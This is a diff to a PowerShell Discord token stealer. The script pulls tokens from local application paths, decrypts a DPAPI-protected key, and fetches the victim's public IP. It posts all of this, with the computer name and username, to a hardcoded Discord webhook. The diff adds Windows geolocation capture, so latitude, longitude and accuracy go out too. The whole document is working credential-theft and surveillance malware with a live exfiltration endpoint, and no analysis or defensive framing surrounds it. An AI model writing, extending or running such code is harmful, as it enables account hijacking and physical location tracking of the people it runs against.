@@ -32,6 +32,9 @@ $PATHS = @{
 $pattern = @"
 dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*
 "@
+$geo = New-Object System.Device.Location.GeoCoordinateWatcher
+$geo.Start()
+Start-Sleep -Seconds 3
 
 function Compress-Bytes {
     param ([byte[]]$Bytes)
@@ -108,31 +111,49 @@ foreach ($platform in $PATHS.Keys) {
     foreach ($token in $tokens) {
         $token = $token -replace '\\', ''
         
-        if ($watcher.Position.Location.IsUnknown) {
+        $location
+
+        if ($geo.Position.Location.IsUnknown) {
             Write-Host "Could not get location. Make sure Windows Location Services are enabled."
         } else {
-            $loc = $watcher.Position.Location
+            $lat = $geo.Position.Location.Latitude
+            $lon = $geo.Position.Location.Longitude
+            $acc = $geo.Position.Location.HorizontalAccuracy
+            $location = @"
+
+    "Latitude": "$lat",
+    "Longitude": "$lon",
+    "Accuracy": "$acc"
+    
+"@
         }
 
         try {
             $key = Get-Key -path $path
             $key = Unprotect-DPAPI-Key -b64Key $key
             $ip = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.ipify.org?format=json").Content | ConvertFrom-Json
+            $ip = $ip.ip
 
+            $t = '```json'
+            $t2 = '```'
             $message = @"
-{key: "$key",
-token: "$token",
-ip: "$ip"}
+$t
+{"key": "$key",
+"token": "$token",
+"ip": "$ip",
+"location": {$location}
+}
+$t2
 "@
 
             $payload = @{
                 content = $message
                 username = "$env:COMPUTERNAME | $env:USERNAME"
             } | ConvertTo-Json -Compress
-            Invoke-WebRequest -Uri "https://discord.com/api/webhooks/1426167382082060329/SVRJiBFesT48IILlWvBaHPtZWnS3nOuGGp9VggODPoBvt6QsVGfoEITcCWK7_FGWxr3q" -Method Post -Body $payload -ContentType 'application/json'
+            Invoke-WebRequest -UseBasicParsing -Uri "https://discord.com/api/webhooks/1426167382082060329/SVRJiBFesT48IILlWvBaHPtZWnS3nOuGGp9VggODPoBvt6QsVGfoEITcCWK7_FGWxr3q" -Method Post -Body $payload -ContentType 'application/json'
 
         } catch {
-            continue
+            Write-Host "An error occurred:" $_.Exception.Message
         }
     }
 }
